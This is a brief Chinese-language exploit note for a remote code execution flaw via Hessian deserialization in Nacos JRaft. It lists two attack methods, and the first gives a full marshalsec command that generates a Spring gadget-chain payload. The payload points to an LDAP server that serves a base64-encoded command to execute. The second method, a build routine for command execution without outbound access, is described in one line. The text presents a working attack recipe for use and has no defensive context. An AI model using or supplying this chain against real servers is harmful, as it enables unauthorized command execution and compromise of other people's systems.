# Nacos JRaft Hessian 反序列化 RCE

1. 利用方式一：通过 marshalsec 生成 SpringPartiallyComparableAdvisorHolder 利用链。需要出网。（JNDI LDAP 反序列化 + POJONode 触发 TemplatesImpl）

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringPartiallyComparableAdvisorHolder ldap://127.0.0.1:1389/Deserialization/Jackson/nu1r/Base64/{base64编码的命令} | base64
```

2. 利用方式二：通过 build方法 生成利用链子，参数为命令即可，不用出网，但是只是执行命令，不能加载字节码。